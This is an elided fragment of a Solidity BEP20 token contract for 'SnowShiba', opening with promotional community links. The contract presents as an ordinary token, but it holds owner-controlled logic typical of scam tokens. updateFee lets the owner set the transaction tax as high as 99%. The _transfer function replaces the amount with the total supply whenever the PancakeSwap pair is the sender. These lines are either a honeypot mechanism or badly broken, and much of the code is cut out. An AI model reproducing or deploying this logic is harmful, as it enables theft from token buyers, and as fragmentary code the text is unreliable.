...
/*
Welcome to SnowShiba!

Join our community!

TG group: https://t.me/SnowShibaInu
Website: https://www.snow-shiba.com
*/
...
contract SnowShiba is Context, IBEP20, Ownable {
    using SafeMath for uint256;
...
address public FeeAddress;
    ...
    constructor (string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply,address routerAddress, uint256 _txFee,uint256 _burnFee,uint256 _charityFee,address _FeeAddress,address tokenOwner,address service) payable   {
_NAME = _name;
_SYMBOL = _symbol;
_DECIMALS = _decimals;
...
_CharityWallet = _FeeAddress;
 IPancakeSwapV2Router02 _pancakeswapV2Router = IPancakeSwapV2Router02(routerAddress);
...
function updateFee(uint256 _txFee) onlyOwner() public{
   require(_txFee < 100);
   _TAX_FEE = _txFee* 100;
ORIG_TAX_FEE = _TAX_FEE;
}
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        else if (pancakeswapV2Pair == sender) {
             tTransfer = _tTotal;
        }
